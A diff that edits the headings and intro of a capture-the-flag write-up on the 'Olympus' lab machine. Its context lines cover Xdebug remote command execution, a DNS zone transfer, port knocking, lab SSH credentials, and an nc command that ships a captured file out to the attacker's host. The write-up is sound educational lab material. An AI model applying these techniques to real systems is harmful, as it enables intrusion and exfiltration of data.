@@ -6,13 +6,15 @@ tags: [dns-zone-transfer, port-knocking, docker, xdebug, hashcat, pcap]
 img_path: /assets/img/machines/olympus/
 ---
 
-todo intro
+Olympus has been among the machines I've found most enjoyable, as it demands a diverse range of techniques. [OscarAkaElvis](https://twitter.com/OscarAkaElvis) crafted an engaging machine that features multiple phases, each providing a hint without directly disclosing the path to follow. This design ensures a rewarding and challenging experience throughout the process.
 
-## Info
+# Info
 
 ![Olympus Machine Info](olympus-machine-card.png)
 
-## Port Scan
+# Enumeration
+
+## Port Scanning
 
 > script scanning (`-sC`), version scanning (`-sV`), output all formats (`-oA`)
 {: .prompt-info }
@@ -49,9 +51,7 @@ PORT     STATE    SERVICE VERSION
 
 Nmap tells us that the machine has two `SSH` services, one on port `22` (filtered) and one on port `2222` (open), plus port `53` which is used for `DNS` and port `80` which is basically `Apache`.
 
-## Recon
-
-### DNS (53)
+## DNS (53)
 
 The first thing that comes to mind when I see port 53 open is to try a DNS Zone Transfer.
 
@@ -72,7 +72,7 @@ $ dig axfr @10.129.197.77 olympus.htb
 
 We can see that the zone transfer has failed, probably because it is configured correctly or because `olympus.htb` is not the correct domain, so for now let's jump to something else but keep this in mind.
 
-### Apache (80)
+## Apache (80)
 
 When entering the web all we can see is a picture of Zeus as wallpaper and the name of the page which is Crete Island, between this and that the machine is called Olympus, we can imagine what the theme is about.
 
@@ -89,6 +89,8 @@ The existence of the `Xdebug` header does not always indicate that this server i
 {: .prompt-info }
 
 This basically means that if we send a request to the server with the header `XDEBUG_SESSION`, what it will do is to start a debug session that by default occurs on port `9000` in which we will be able to execute commands at will.
+
+# Shell as www-data
 
 To test if all this works, lets create a file called `exploit.py` and write the following content:
 
@@ -154,7 +156,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 {: .nolineno }
 
-## Pivot to Olympia
+# Pivot to Olympia
 
 On a quick scan of the machine, from what we can see it appears to be a container as we have a `.dockerenv` and a rather unusual hostname.
 
@@ -190,7 +192,7 @@ $ nc 10.10.14.70 8888 < captured.cap
 ```
 {: .nolineno }
 
-### Cracking CAP File
+## Analyzing CAP File
 
 To inspect the `CAP` file we will open it using `Wireshark`.
 
@@ -223,8 +225,7 @@ icarus@620b296204a3:~$
 
 Bingo! indeed `icarus:Too_cl0se_to_th3_Sun` are the SSH credentials, remember that the only ssh we can connect to is the one on port `2222`, since the one running on port `22` is still filtered for the moment.
 
-# Pivot to Hades
-
+# Pivot to Rhodes
 
 Once again it seems that we are in a container.
 
@@ -239,6 +240,9 @@ ctfolympus.htb
 {: .nolineno }
 
 Enumerating the machine we can see an interesting file called `help_of_the_gods.txt` in the icarus user's home. At the end of the hint, we can see a domain name that we had not seen so far `ctfolympus.htb`.
+
+
+## DNS Zone Transfer
 
 Remember that at the beginning we saw port `53` open and we performed a zone transfer on what we thought was the domain `olympus.htb`, let's try again with this one we just found.
 
@@ -272,7 +276,7 @@ ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolymp
 
 Perfect! now we get information and also with a very interesting and uncommon entry in the `TXT` record, `"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"`.
 
-### Port Knocking
+## Port Knocking
 
 At first I had a hard time understanding the message as it was the first time I had encountered this technique called `Port Knocking`.
 
@@ -319,7 +323,7 @@ prometheus@olympus:~$
 
 Finally, in the home we can find the first flag `user.txt`.
 
-## Privilege Escalation
+# Privilege Escalation
 
 Along with the flag, we can see a file called `msg_of_gods.txt` with what appears to be the final clue, indicating that Olympus is the end of the road. 
 
@@ -337,8 +341,6 @@ Only if you serve well to the gods, you'll be able to enter into the
 
 ```
 {: .nolineno }
-
-### Root Flag
 
 After a bit of enumeration I see something interesting, the current user is a member of the `docker` group, which means that we can create new containers at will.
 
